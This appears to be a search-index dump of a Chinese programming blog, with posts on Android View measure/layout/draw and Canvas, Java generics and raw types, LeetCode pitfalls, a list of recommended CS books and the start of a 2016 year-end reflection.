Java 书籍 Java核心技术 卷2：高级特性（原书第9版） 链接 Java语言推荐进阶书籍 生活 网站 V2EX 链接 程序员生活 计算机网络 书籍 计算机网络（第5版） 链接 计算机网络基础推荐书籍 操作系统 书籍 现代操作系统（原书第3版） 链接 操作系统推荐书籍 计算机网络 书籍 TCP/IP详解：卷1+卷2+卷3 链接 计算机网络进阶推荐书籍 Linux 公开课 Linux 入门基础 链接 Linux 入门基础 Android 博客 Android学习路线指南 链接 Android开发艺术探索一书的作者分享的安卓学习路线，供参考 Android 书籍 第一行代码 Android 第2版 链接 Android入门推荐书籍 Android 书籍 安卓Android开发艺术探索+Android群英传+源码设计模式解析 链接 Android进阶必读 计算机系统 书籍 深入理解计算机系统（原书第3版） 链接 理解计算机系统 汇编语言 书籍 汇编语言（第3版） 链接 汇编语言推荐书籍 汇编语言 博客 上面这本书的检测点与实验解析 链接 上面这本书的检测点与实验解析By2015级陈志浩 规范 书籍 重构 改善既有代码的设计 链接 改善代码质量的进阶书籍 Java 书籍 深入理解Java虚拟机：JVM高级特性与最佳实践（第2版） 链接 Java深入必读 Java 书籍 华章专业开发者丛书·Java并发编程实战 链接 Java并发编程推荐书籍 设计模式 书籍 O’Reilly：Head First设计模式（中文版） 链接 设计模式推荐书籍 iOS 书籍 Objective-C程序设计（第6版） 链接 Objective-C语言入门书籍 iOS 书籍 Objective-C基础教程(第2版) 链接 Objective-C语言入门书籍’ iOS 书籍 Effective Objective-C 2.0：编写高质量iOS与OS X代码的52个有效方法 链接 Objective-C与iOS开发提高","tags":[{"name":"Resource","slug":"Resource","permalink":"https://www.viseator.com/tags/Resource/"}]},{"title":"Android View绘制（四）onDraw过程与Canvas Bitmap","date":"2017-03-12T08:29:40.000Z","path":"2017/03/12/android_view_onDraw_canvas/","text":"draw()方法经过对View的测量与布局过程后，下面就到了真正的View绘制的过程了。这个过程从调用根View的draw()方法开始：（省略部分代码） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public void draw(Canvas canvas) &#123; final int privateFlags = mPrivateFlags; final boolean dirtyOpaque = (privateFlags &amp; PFLAG_DIRTY_MASK) == PFLAG_DIRTY_OPAQUE &amp;&amp; (mAttachInfo == null || !mAttachInfo.mIgnoreDirtyState); mPrivateFlags = (privateFlags &amp; ~PFLAG_DIRTY_MASK) | PFLAG_DRAWN; /* * Draw traversal performs several drawing steps which must be executed * in the appropriate order: * * 1. Draw the background * 2. If necessary, save the canvas' layers to prepare for fading * 3. Draw view's content * 4. Draw children * 5. If necessary, draw the fading edges and restore layers * 6. Draw decorations (scrollbars for instance) */ // Step 1, draw the background, if needed int saveCount; if (!dirtyOpaque) &#123; drawBackground(canvas); &#125; // skip step 2 &amp; 5 if possible (common case) final int viewFlags = mViewFlags; boolean horizontalEdges = (viewFlags &amp; FADING_EDGE_HORIZONTAL) != 0; boolean verticalEdges = (viewFlags &amp; FADING_EDGE_VERTICAL) != 0; if (!verticalEdges &amp;&amp; !horizontalEdges) &#123; // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); // Overlay is part of the content and draws beneath Foreground if (mOverlay != null &amp;&amp; !mOverlay.isEmpty()) &#123; mOverlay.getOverlayView().dispatchDraw(canvas); &#125; // Step 6, draw decorations (foreground, scrollbars) onDrawForeground(canvas); // we're done... return; &#125; 这段源码来自于View，过程非常清晰，执行了以下的步骤（如果需要）： 27-30行进行判断是否跳过注释中的第2、5步，通常情况跳过 22-24行，进行背景的绘制 32行，调用onDraw()方法进行自身的绘制 35行，调用dispatchDraw()方法，进行子View的绘制（调用子View的draw()方法），同时也表明了子View的绘制在自身之后这一顺序 43行，进行前景的绘制，一般为装饰组件，如滚动条等 dispatchDraw()方法onDraw()方法先不谈，看看dispatchDraw()方法做了什么，以ViewGroup为例：(省略部分代码) 12345678910111213@Overrideprotected void dispatchDraw(Canvas canvas) &#123; for (int i = 0; i &lt; childrenCount; i++) &#123; if ((transientChild.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || transientChild.getAnimation() != null) &#123; more |= drawChild(canvas, transientChild, drawingTime); &#125; &#125;&#125;protected boolean drawChild(Canvas canvas, View child, long drawingTime) &#123; return child.draw(canvas, this, drawingTime);&#125; 简单来看，依次调用了子View的draw()方法。所以对于有子View的ViewGroup， 我们需要重写这个方法来决定子View绘制的顺序。 Canvas Bitmap Surface间的联系背景与前景绘制的过程一般不由我们控制，自定义View时关键的内容就在onDraw()方法中。 你可能已经发现，在这些View绘制过程中的函数都具有一个参数Canvas，这个Canvas字面意义上为画布，那它实际上是什么，又在绘制过程中起着什么样的重要作用呢？ 我们可以把Canvas看作是系统给予我们的一个虚拟的对象，或者说是我们绘制图形的一个中介，Canvas具有一系列的方法可以供我们调用来直观地绘制图形，我们对于Canvas的所有操作都会被系统处理从而反映在屏幕上而不用我们去手动地决定哪一个像素应该显示什么颜色。 在Canvas背后则是一个Bitmap对象，我们的绘制实际上会反映在这个Bitmap上再交由系统来显示。如果我们需要自己创建一个Canvas，我们必须创建一个Bitmap对象作为Canvas的构造参数。例如： 12Bitmap b = Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888);Canvas c = new Canvas(b); 这样这个Canvas就会在指定的Bitmap上进行绘制，我们也可以通过Canvas的drawBitmap()方法来在指定的Bitmap上绘制。 那么问题来了，onDraw()方法给我们提供的这个Canvas是从哪里来的，为什么我们对它的操作可以反映到屏幕上？下面这张图便于我们去了解这个过程： 可以看到，我们的屏幕被分为了几个Window，每一个Window都有着自己的Surface，Surface具有两级缓存，每个缓存中存放着将要显示在屏幕上的像素数据，而当我们想要刷新屏幕显示新的内容时，对应的Surface将会读取缓存中的数据来进行更新。 onDraw()方法中的canvas就是在一个Surface显示完毕，将这个Surface锁定时由它返回的，在这个canvas上进行的操作就可以在下一次刷新屏幕时显示，但是实际上并不是由canvas直接写数据到它的Surface缓存中，这中间还有一个对象就是我们之前提到的Bitmap，Bitmap储存着的正是像素信息，而Surface返回的canvas中含有的就是一个指向Surface缓存的Bitmap。 梳理一下整个过程，我们需要做的是操作这个封装了一系列绘图方法的canvas，canvas将操作反映到内含的Bitmap上，Bitmap将数据反映给Surface的缓存，Surface在下一次刷新时读取缓存中的内容并显示到屏幕上。 这里还应注意的是每个Window有且仅有一个单继承（即只有一个根）的View树，View将会将Surface返回的canvas向下传递来让子View依次完成部分区域的绘制。 弄清楚这个canvas的来源之后，我们就可以放心地在用它来“作画”了。 onDraw()方法在onDraw()方法中我们可以对方法参数提供的canvas进行操作，绘制各种自定义的图形。 我们可以选择一个现有的View作为自定义View的父类，在它的onDraw()方法中一定要调用super.onDraw()来令它绘制本来的组件，我们可以在调用super.onDraw()之前或之后插入我们自己的代码，这取决你对绘制顺序的需要。 注意有些View如Linearlayout默认是不绘制自己的，也就是说它们并不会调用onDraw()方法，当我们需要继承这类View来进行自定义并进行绘制的话需要调用setWillNotDraw(false);。可以在onMeasure()方法中调用。 另一种方式是继承于View，可以更为自由地订制各种行为。 Canvas中封装了非常多的方法，下面列举一部分： drawArc)(float left, float top, float right, float bottom, float startAngle, float sweepAngle, boolean useCenter, Paint paint)：绘制椭圆 drawCircle)(float cx, float cy, float radius, Paint paint)：绘制圆形 drawColor)(int color)：对整个Canvas填充颜色 drawLine)(float startX, float startY, float stopX, float stopY, Paint paint)：绘制直线 drawLines)(float[] pts, int offset, int count, Paint paint)：绘制一系列直线 drawPicture)(Picture picture, Rect dst)：绘制一张图片 drawPoint)(float x, float y, Paint paint)：绘制一个点 drawPoints)(float[] pts, int offset, int count, Paint paint)：绘制一系列点 drawRect)(float left, float top, float right, float bottom, Paint paint)：绘制矩形 drawRoundRect)(RectF rect, float rx, float ry, Paint paint)：绘制圆角矩形 drawText)(CharSequence text, int start, int end, float x, float y, Paint paint)：绘制文字 drawTextOnPath)(String text, Path path, float hOffset, float vOffset, Paint paint)：沿路径绘制文字 方法的详细信息在官方文档中。 我们注意到，许多绘制方法都需要一个Paint参数， 这个Paint可以理解为系统为我们抽象出的一支画笔，我们所绘制的图形都是用这支画笔绘制出来的，当然因此我们就可以对画笔设置颜色、粗细等属性，我们甚至可以用setShader()方法为这个Paint设置一个Shader，来实现各种特殊的动态效果，Shader的使用需要另起一篇博客来讲。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"}]},{"title":"Android View绘制（三）layout过程","date":"2017-03-12T06:02:47.000Z","path":"2017/03/12/android_view_onLayout/","text":"经过上一篇介绍的measure过程之后，各个View的尺寸信息已经存储在了每个View中，下面是layout过程，layout过程的目的是根据上一步中计算出的尺寸来正确设置各个View及其后代的位置。这个过程首先被调用的是View的layout()方法，layout()的方法签名是public void layout(int l, int t, int r, int b)，四个参数分别为左边界距父View左边界的距离，上边界距父View上边界的距离，右边界距父View左边界的距离，下边界距父View上边界的距离。 12boolean changed = isLayoutModeOptical(mParent) ? setOpticalFrame(l, t, r, b) : setFrame(l, t, r, b); changed是用于传递给onLayout()方法的参数，它指示了布局是否被改变。 后面的表达式查看了父View的布局模式是否需要显示边框，如需要，调用的是setOpticalFrame()方法： 12345678910private boolean setOpticalFrame(int left, int top, int right, int bottom) &#123; Insets parentInsets = mParent instanceof View ? ((View) mParent).getOpticalInsets() : Insets.NONE; Insets childInsets = getOpticalInsets(); return setFrame( left + parentInsets.left - childInsets.left, top + parentInsets.top - childInsets.top, right + parentInsets.left + childInsets.right, bottom + parentInsets.top + childInsets.bottom);&#125; 可以看到这个方法读取了设置的边框值， 把原值加上边框值后还是调用了setFrame()方法。 setFrame()方法通过传入的参数确定了该View最终的位置以及尺寸。 可以看到，一个View最终显示在什么位置以及它的尺寸是由layout()方法决定的，onMeasure()方法只是将测量出的View期望具有的大小储存在View中。一般情况下，我们会根据储存的这个尺寸来作为设定的依据。 接下来layout()方法会调用onLayout()方法，（如果需要的话）我们需要重写这个方法来调用子View的layout()方法。所以决定子View如何显示的关键步骤就在这里，他们的位置和尺寸完全取决于这里调用它们的layout()方法时传入的参数。当然一般情况下我们会根据子View中的测量结果来设置这个值。这里拿FrameLayout这个需要处理子View的ViewGroup实例来举例： 1234@Overrideprotected void onLayout(boolean changed, int left, int top, int right, int bottom) &#123; layoutChildren(left, top, right, bottom, false /* no force left gravity */);&#125; 直接调用了layoutChildren()：（省略部分行） 123456789101112131415161718192021222324252627282930313233343536void layoutChildren(int left, int top, int right, int bottom, boolean forceLeftGravity) &#123; final int count = getChildCount(); final int parentLeft = getPaddingLeftWithForeground(); final int parentRight = right - left - getPaddingRightWithForeground(); final int parentTop = getPaddingTopWithForeground(); final int parentBottom = bottom - top - getPaddingBottomWithForeground(); for (int i = 0; i &lt; count; i++) &#123; final View child = getChildAt(i); final int width = child.getMeasuredWidth(); final int height = child.getMeasuredHeight(); int childLeft; int childTop; switch (verticalGravity) &#123; case Gravity.TOP: childTop = parentTop + lp.topMargin; break; case Gravity.CENTER_VERTICAL: childTop = parentTop + (parentBottom - parentTop - height) / 2 + lp.topMargin - lp.bottomMargin; break; case Gravity.BOTTOM: childTop = parentBottom - height - lp.bottomMargin; break; default: childTop = parentTop + lp.topMargin; &#125; child.layout(childLeft, childTop, childLeft + width, childTop + height); &#125; &#125;&#125; 省略了与获取布局属性相关的代码，可以看到： 4-8行获取了父View的位置数据并在18-31行用于确定最终的位置数据 10-11行遍历了所有的子View 12-13行获取了子View中在上一步骤的测量过程中储存的宽和高，并用于第33行中设置最终的右边界与下边界 第33行调用子View的layout()方法","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"}]},{"title":"Android View绘制（二）measure过程","date":"2017-03-10T10:30:16.000Z","path":"2017/03/10/android_view_onMeasure/","text":"上一篇博客简单地介绍了View绘制的生命周期， 从这篇博客开始将会对这个周期中一些有用的过程进行一个详细一些的介绍。这篇的主角就是在构造方法之后调用的measure过程。 为了演示，继承了TextView来实现一个自定义的View。注意这里继承的应该是android.support.v7.widget.AppCompatTextView这个类。同时为了xml文件的正常解析，我们需要实现View的三个构造方法。 1234567891011public VView(Context context) &#123; super(context);&#125;public VView(Context context, AttributeSet attrs) &#123; super(context, attrs);&#125;public VView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr);&#125; 再通过完整包名的方法在xml布局文件中创建我们的View就可以直接显示了。 12345&lt;com.viseator.viewtest.VView android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"@color/Gray\" /&gt; 这里给了TextView一个背景颜色便于后面的观察。 下面就开始分析measure过程。 measure是一个自顶向下的过程，即父View会依次调用它的子View的measure()方法来对它的子View进行测量。 View的measure()方法最终会调用onMeasure()，真正的尺寸信息就是在onMeasure()方法中最终确定的。所以我们需要做的就是在自定义View中重写onMeasure()方法。 那么子View根据什么来确定自己应该具有的尺寸呢？当然不可能让子View自由地决定自己的大小，父View必然需要向子View传递信息来帮助子View来确定尺寸，而子View则必须满足父View的要求。查看measure()的方法签名： 1public final void measure(int widthMeasureSpec, int heightMeasureSpec) 这里的widthMeasureSpec与heightMeasureSpec就是存储这一信息的参数。它们的类型是int，内部以高两位来存储测量的模式，低三十位为测量的大小，计算中使用了位运算来提高并优化效率。当然我们不必使用位运算来获得对应的数值，View.MeasureSpec为我们提供了对应的方法。 测量模式有三种： EXACTLY：精确值模式，即子View必须使用这一尺寸，并且保证它们的所有后代都在这个范围之内。当我们将控件的layout_width、layout_height属性指定为具体数值或match_parent时，系统使用这一模式。 UNSPECIFIED：无限制模式，不对子View施加任何限制，完全由子View决定自己的大小。可以用于查看子View想要的尺寸，比如可以把子View的长度使用EXACTLY模式限制在100，不限制宽度来查看子View在长度为100情况想要的宽度。 AT_MOST：最大值模式，只限制子View能具有的最大尺寸，子View必须保证它和它的后代们都在这一范围之内。 了解这些，我们就可以通过重写onMeasure()来确定一个View的尺寸。 但在重写方法时要注意：必须调用setMeasuredDimension() 来将最终尺寸存储在View中，否则会抛出一个IllegalStateException。 xml: 12345&lt;com.viseator.viewtest.VView android:layout_width=\"wrap_content\" android:layout_height=\"100dp\" android:background=\"@color/Gray\" /&gt; VView: 1234567891011@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; int widthMode = MeasureSpec.getMode(widthMeasureSpec); int heightMode = MeasureSpec.getMode(heightMeasureSpec); int width = MeasureSpec.getSize(widthMeasureSpec); int height = MeasureSpec.getSize(heightMeasureSpec); Log.d(TAG, \"widthMode: \" + widthMode); Log.d(TAG, \"heightMode: \" + heightMode); Log.d(TAG, \"width :\" + width); Log.d(TAG, \"height :\" + height); super.onMeasure(widthMeasureSpec, heightMeasureSpec); log: 这段简单的代码验证了之前的说法，分别对宽高设置了wrap_content和固定值，可以发现模式分别为AT_MOST与EXACTLY（以数值表示）。 这里输出的宽高值是以像素为单位的，可以看到高度的期望值就是设置的大小，但wrap_content期望的宽度值为1080（屏幕宽度），默认即为屏幕宽度，但最终计算得出的宽度值由于里面没有文字所以为0。 同样地，UNSPECIFIED模式给出的默认尺寸也是屏幕的宽/高。 所以我们可以看到如果想要实现wrap_content的效果，我们必须在onMeasure中对AT_MOST模式计算其内容宽/高并作为最终的宽/高，否则将以屏幕的宽/高进行填充。以LinearLayout的源码为例： 1234567891011121314151617181920212223242526272829if (useLargestChild &amp;&amp; (heightMode == MeasureSpec.AT_MOST || heightMode == MeasureSpec.UNSPECIFIED)) &#123; mTotalLength = 0; for (int i = 0; i &lt; count; ++i) &#123; final View child = getVirtualChildAt(i); if (child == null) &#123; mTotalLength += measureNullChild(i); continue; &#125; if (child.getVisibility() == GONE) &#123; i += getChildrenSkipCount(child, i); continue; &#125; final LinearLayout.LayoutParams lp = (LinearLayout.LayoutParams) child.getLayoutParams(); // Account for negative margins final int totalLength = mTotalLength; mTotalLength = Math.max(totalLength, totalLength + largestChildHeight + lp.topMargin + lp.bottomMargin + getNextLocationOffset(child)); &#125;&#125;// Add in our paddingmTotalLength += mPaddingTop + mPaddingBottom;int heightSize = mTotalLength; 这部分代码向我们展示了LinearLayout处理子View并计算所有的高度的情况。 知道了这个调用过程，我们就可以真正地进行onMeasure()的重写了。 例如可以暴力指定View尺寸： 1234@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(100,600);&#125; 可以为AT_MOST与UNSPECIFIED模式指定一个默认大小： 123456789101112131415@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(measureSize(widthMeasureSpec), measureSize(heightMeasureSpec));&#125;int measureSize(int measureSpec) &#123; int mode = MeasureSpec.getMode(measureSpec); int size = MeasureSpec.getSize(measureSpec); if (mode == MeasureSpec.EXACTLY) &#123; return size; &#125; else &#123; size = 300; //Default size return Math.min(size,MeasureSpec.getSize(measureSpec)); &#125;&#125; 至于更复杂的计算逻辑由于本人能力有限就不写demo了，如果以后实际中遇到需要的时候再作补充。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"}]},{"title":"Android View绘制（一）生命周期总览","date":"2017-03-09T09:22:41.000Z","path":"2017/03/09/android_view_lifeCycle/","text":"为了直观表示整个过程，我制作了一张流程图。注意以下只是整个生命周期中比较常用的方法，并不代表所有的过程。 当一个Activity收到焦点即将要处于激活状态时，将会被要求绘制它的布局，绘制布局之前的过程在这里不涉及，我们从绘制View开始分析。 每个Activity被要求提供一个ViewGroup作为View树的根，也就是我们熟悉的setContentView方法。 1234567891011121314@Overridepublic void setContentView(@LayoutRes int layoutResID) &#123; getDelegate().setContentView(layoutResID);&#125;@Overridepublic void setContentView(View view) &#123; getDelegate().setContentView(view);&#125;@Overridepublic void setContentView(View view, ViewGroup.LayoutParams params) &#123; getDelegate().setContentView(view, params);&#125; 可以看到setContentView拥有三种形式，可以直接传入View、传入一个layout资源文件，或传入一个View文件和一个用于提供参数的LayoutParams对象。 整个过程将从这个根View开始，并遍历它的子View来逐一绘制，每个ViewGroup承担了要求它的子View进行绘制的责任，每个View承担了绘制自身的责任。并且父View会在子View完成绘制之前进行绘制，同级的View将以它们出现在树中的顺序进行绘制。 首先调用的当然是View的构造函数，构造函数分为两种，一种供代码创建的View使用，另一种是由layout文件生成的View使用，区别在于后者会从layout文件中读入所有的属性，前者的属性则需要在代码中设置。 另外后者在所有的子View都生成完毕之后会回调onFinishInflate方法。 在正式绘制之前要进行两个过程（布局机制[layout mechanism]）： 首先是measure过程。这是一个自顶向下的过程，父View将期望尺寸传递给子View，子View需要根据这一信息确定自己的尺寸，并且保证这一尺寸满足父View对其的要求，在子View确定自己尺寸的过程中也要向它的子View传递信息，就这样递归地确定自己的尺寸信息并储存在自身中，保证在measure方法返回时，自身的尺寸信息已经确定。所以在根View的measure方法返回时，所有子View的尺寸信息已经全部确定了。 这个过程需要注意一个View可能不止一次地调用measure方法来对子View进行测量。比如，可能要先传递一个无限制的信息来获取子View想要的尺寸，当子View希望的尺寸过大或过小时，父View需要再次调用measure方法来给予子View一些限制。 第二个是layout过程，这也是一个自顶向下的遍历过程，在这个过程中父View负责按照上一个过程中计算并储存在View中的尺寸信息来正确地放置子View。 同时这个过程可以通过调用requestLayout()来重新进行，并且会引起后面步骤的执行，相当于对以这个View为根的View树进行重新布局。 下面就是真正的绘制过程了，也就是View的draw()方法，在draw()方法中，（如果需要）会依次调用如下方法： drawBackground()：在画布上绘制特定的背景 onDraw()：重写View几乎必重写的一个方法，用于绘制图形 dispatchDraw()：ViewGroup会重写这个方法，用于对所有的子View调用draw()方法进行绘制 onDrawForeground()：用于绘制前景（如果需要） 可以看到如果需要调用上述的方法必定会按照这个顺序进行，也就是说，子View的绘制是在父View绘制之后进行的，而同级View的绘制是根据View在父View中的顺序进行绘制的。 同时这个过程可以通过调用invalidate()来重新进行，相当于进行某个View的重绘。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"},{"name":"LifeCycle","slug":"LifeCycle","permalink":"https://www.viseator.com/tags/LifeCycle/"}]},{"title":"Java泛型中List、List&lt;Object&gt;、List&lt;?&gt;的区别","date":"2017-02-14T08:30:22.000Z","path":"2017/02/14/DiffInGeneric/","text":"Java 1.5中引入了泛型的概念以增加代码的安全性与清晰度，同时为了提供对旧代码的兼容性，让旧代码不经过改动也可以在新版本中运行，Java提供了原生态类型（或称原始类型）。但是实际中在新的代码中已经不应该使用原生态类型。 原生态类型的含义是不带任何实际参数的泛型名称，例如Java 1.5后改为泛型实现的List&lt;E&gt;，List就是它的原生态类型，与没有引入泛型之前的类型完全一致。 而在虚拟机层面上，是没有泛型这一概念的——所有对象都属于普通类。在编译时，所有的泛型类都会被视为原生态类型。 那么为什么不应该使用原生态类型呢？ 如果使用原生态类型，就失掉了泛型在安全性和表述性方面的所有优势。——Effective Java 泛型的目的简单地说就是可以让一些运行时才能发现的错误可以在编译期间就可以被编译器所检测出，运行时出问题的代价与编译期出现问题的代价的差别可想而知。换句话说，泛型是编译器的一种及时发现错误的机制，同时也给用户带来了代码的清晰与简洁的附加好处（不必再写一些复杂而危险并且不直观的强制类型转换）。 下面就进入正题谈谈以List为例时List、List&lt;Object&gt;、List&lt;?&gt;的区别。 先下定义： List：原生态类型 List&lt;Object&gt;：参数化的类型，表明List中可以容纳任意类型的对象 List&lt;?&gt;：无限定通配符类型，表示只能包含某一种未知对象类型 下面看一段代码： 1234567public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); List list = strings;//ok List&lt;Object&gt; objects = strings;//Error: java: incompatible types: java.util.List&lt;java.lang.String&gt; cannot be converted to java.util.List&lt;java.lang.Object&gt; &#125;&#125; 我们创建了一个List&lt;String&gt;类型的对象strings，再把它赋给原生态类型List，这是可以的。但是第5行中尝试把它传递给List&lt;Object&gt;时，出现了一个类型不相容错误，注意，这是一个编译期错误。 这是因为泛型有子类型化的规则： List&lt;String&gt;是原生态类型List的一个子类型。虽然String是Object的子类型，但是由于泛型是不可协变的，List&lt;String&gt;并不是List&lt;Object&gt;的子类型，所以这里的传递无法通过编译。 如果像上面那样使用原生态类型会有什么隐患呢？看下面一段代码： 1234567891011public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); unsafeAdd(strings, (Integer)1); System.out.println(strings.get(0)); &#125; private static void unsafeAdd(List list, Object object) &#123; list.add(object); &#125;&#125; 编译器提示了两条警告： 第8行： 123456warning: [rawtypes] found raw type: List private static void unsafeAdd(List list, Object object) &#123; ^ missing type arguments for generic class List&lt;E&gt; where E is a type-variable: E extends Object declared in interface List 警告发现了原生态类型List，同时还贴心地指出了List&lt;E&gt;的形式以及E的来源。 第9行： 12345warning: [unchecked] unchecked call to add(E) as a member of the raw type List list.add(object); ^ where E is a type-variable: E extends Object declared in interface List 同样指出了我们正在把一个对象添加到List中，而这个添加过程由于我们使用了原生态类型而无法被检验。 如果忽略这两条警告并运行这个程序，显然会出现一条错误： 第5行： 1Exception in thread \"main\" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String 我们试图把一个自动装箱后的Integer对象插入到了一个被声明为List&lt;String&gt;的List中，由于我们在unsafeAdd方法中使用了原生态类型，从而使得编译器无法在编译期间检查add参数的合法性，从而没有产生编译错误而是产生了一条警告，运行后当试图把这个错误的Integer对象作为String取出时就会出现ClassCaseException异常，这是个运行时的异常，导致了程序中断。 如果我们把unsafeAdd方法的参数从List改为List&lt;Object&gt;会发生什么呢？正如之前所说的那样，由于List&lt;String&gt;并不是List&lt;Object&gt;的子类型，所以在传递参数的时候就会出现第一段代码中出现的编译期错误。这体现了泛型所带来的安全性。 可以这么说，List&lt;Object&gt;唯一特殊的地方只是Object是所有类型的超类，由于泛型的不可协变性，它只能表示List中可以容纳所有类型的对象，却不能表示任何参数类型的List&lt;E&gt;。 而List&lt;?&gt;则是通配符类型中的一种特例，它并没有extend或super这样的限制，从而可以做到引用任意参数类型的List&lt;E&gt;。但由于没有表示类型的符号（E），在方法中无法引用这个类型，所以它只用于无需使用具体类型的方法之中，如果不是这个情况，则需要使用泛型方法（只用List&lt;?&gt;的不是一个泛型方法，它具有List&lt;?&gt;这个固定的参数`）。 但是List&lt;?&gt;还是不能用作上面的unsafeAdd的参数，修改后会出现一条奇怪的编译错误： 123456789error: no suitable method found for add(Object) list.add(object); ^ method Collection.add(CAP#1) is not applicable (argument mismatch; Object cannot be converted to CAP#1) method List.add(CAP#1) is not applicable (argument mismatch; Object cannot be converted to CAP#1) where CAP#1 is a fresh type-variable: CAP#1 extends Object from capture of ? 这是因为无法将任何元素（null除外）放入List&lt;?&gt;中。这又是为什么呢？先来看一个有限定通配符的例子： 123456789public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;? extends Number&gt; numbers = new ArrayList&lt;Integer&gt;(); numbers= new ArrayList&lt;Double&gt;(); numbers= new ArrayList&lt;Float&gt;(); numbers = new ArrayList&lt;Number&gt;(); numbers.add(new Integer(1)); &#125;&#125; 第7行报出了与之前相似的编译错误： 123456789error: no suitable method found for add(Integer) numbers.add(new Integer(1)); ^ method Collection.add(CAP#1) is not applicable (argument mismatch; Integer cannot be converted to CAP#1) method List.add(CAP#1) is not applicable (argument mismatch; Integer cannot be converted to CAP#1) where CAP#1 is a fresh type-variable: CAP#1 extends Number from capture of ? extends Number 这次我们可以看出错误的原因：可以将一个List&lt;Integer&gt;传递给List&lt;? extends Number&gt;，因为Integer是Number的子类，符合限定符的条件。同理，也可以将类似的对象传递给它，当然也可以把List&lt;Number&gt;传递给它。 如果允许这个对象的add操作，我们无法知道这个参数是否与对象的泛型参数相同，因为我们只知道它是Number的一个子类。 123List&lt;? extends Parent&gt; list = new ArrayList&lt;Child&gt;();List&lt;? extends Parent&gt; parents = list;list.add(new Parent()); 上面的1,2两行是完全合法的，如果允许第3行的add操作，那么会把一个Parent对象加入到一个实际类型是Child的List中，而Parentis-not-a Child，这破坏了Java的类型安全，是绝对不允许的。 上面是有限制通配符的情况，那么针对List&lt;?&gt;这样的无限制通配符更是如此。因此，为了保证类型安全，不允许对List&lt;?&gt;或List&lt;? extends E&gt;这样的通配符类型进行类似add的操作。 使用泛型方法可以避免这个问题（重申通配符类型并不是泛型方法），使用无限制通配符类型可以取代其他需要表示包含某一种对象类型的泛型类型的情况而不是使用原生态类型List。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.viseator.com/tags/Java/"}]},{"title":"LeetCode踩坑集锦","date":"2017-02-05T07:11:24.000Z","path":"2017/02/05/LeetCode/","text":"写在前面寒假（假装）看完《数据结构与算法分析》之后决定是时候开始做LeetCode的题目了，在这里记录下一些LeetCode过程中遇到的坑，做LeetCode不仅是对算法的一种考验，也是对Java基础知识的一种考查，在Java基础并不是太好的现在做一定会漏洞百出，在这里统一做一个记录，也会写下对一些题目的想法。 LeetCodeTwo Sum直观上的方法是遍历所有元素对找出答案，看了解答以后发现可以用Hash表实现，Hash表可以进行对另一个元素的快速查找并返回对应的位置。 12345678910111213public static int[] twoSum(int[] nums, int target) &#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; map.put(nums[i], i); &#125; for (Integer num : map.keySet()) &#123; if (map.containsKey(target - num) &amp;&amp; !Objects.equals(map.get(num), map.get(target - num))) &#123; return new int[]&#123;map.get(num), map.get(target - num)&#125;; &#125; &#125; return null;&#125; 上面的代码在用例[3,3] 6的时候返回结果为null，原因是第7行中第二个判断条件不成立，由于构建hash表的时候后面一个[3,1]覆盖了前面的[3,0]导致无法同时找到两个位置。（提醒了hash表一对一的性质，后面加入的元素如果key相同会覆盖前面的元素） 解决办法是不遍历key而是直接遍历nums数组，比较循环的索引和hash表的value，这样可以保证找到对应的那个位置不同的元素位置。 Rotate Array12345678910public static void rotate(int[] nums, int k) &#123; for (int i = 0; i &lt; k; i++) &#123; int[] temp = new int[nums.length]; temp[0] = nums[nums.length - 1]; for (int j = 0; j &lt; nums.length-1; j++) &#123; temp[j + 1] = nums[j]; &#125; nums = temp; &#125;&#125; 错误的原因是没有理解数组元素传递的本质是对数组对象引用的值传递，刚开始看到这题目觉得怎么可以用java做，java都是值传递无法改变原来数组。上面的做法的结果是把一个新的数组对象的引用赋给了nums的一个拷贝，但是原来的nums并没有引用到新的地址，所以原nums还是保持不变。 查了相关资料了解到数组元素的传递与对象一样（数组也可以看成new int[]产生的对象），传递的是数组的引用的拷贝，可以通过这个引用来修改原数组的数据。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.viseator.com/tags/Java/"},{"name":"Algorithm","slug":"Algorithm","permalink":"https://www.viseator.com/tags/Algorithm/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://www.viseator.com/tags/LeetCode/"}]},{"title":"2016年度总结","date":"2017-01-20T03:48:14.000Z","path":"2017/01/20/2016年度总结/","text":"2016年度总结写在前面许多人在跟我聊天的时候感慨，时间怎么过得这么快，不知不觉自己就是二十多的人了，过几年就要奔三了。相反地，我却觉得时间过得却不是那么快，因为自己确实在随着时间而改变，而且这样的改变是自己实实在在可以感受到的。从初中开始过来的这几年，可以说是一年一个样子，每次翻看自己一年前写的东西都会看到当时的幼稚与无知，自己也有着许许多多的习惯、看法、认识在随着时间推移在改变着。 而2016年是对身边每一个像我一样的新生都十分关键的一年，经历了身份、时空的转变，带来的是各种观念的迅速变化，但感到庆幸的是我并不惧怕改变。 